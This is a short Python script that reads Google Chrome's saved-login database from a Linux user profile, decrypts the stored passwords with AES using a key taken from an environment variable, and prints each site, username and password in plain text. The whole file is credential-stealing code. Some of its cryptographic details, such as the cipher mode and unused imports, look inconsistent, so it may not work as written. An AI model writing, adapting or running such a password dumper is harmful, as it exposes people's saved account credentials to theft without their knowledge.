import os, sqlite3, json, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_passwords():
    key = os.getenv("ENC_KEY")
    db_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cursor.fetchall()
    for url, user, cipher in rows:
        if cipher[:3] != b'v10':
            continue
        iv = cipher[3:15]
        data = cipher[15:]
        cipher = AES.new(key.encode(), AES.MODE_GCM, iv)
        plain = cipher.decrypt(data)
        print(json.dumps({"url": url, "user": user, "pass": plain.decode()}))

if __name__ == "__main__":
    decrypt_passwords()
